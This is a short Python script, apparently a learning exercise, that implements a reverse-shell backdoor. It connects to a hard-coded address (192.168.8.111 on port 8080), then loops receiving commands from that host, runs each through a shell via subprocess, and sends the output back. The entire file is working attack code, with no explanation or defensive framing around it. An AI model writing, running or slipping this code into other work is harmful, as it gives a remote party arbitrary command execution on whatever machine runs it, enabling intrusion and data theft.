import socket
import subprocess


def command_execution(command):
    return subprocess.check_output(command, shell=True)


backdoor_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

backdoor_server.connect(("192.168.8.111", 8080))
backdoor_server.send(("Hello World\n").encode())

while True:
    command = backdoor_server.recv(1024)  # byte
    cmd = command_execution(command)
    backdoor_server.send(cmd)

backdoor_server.close()
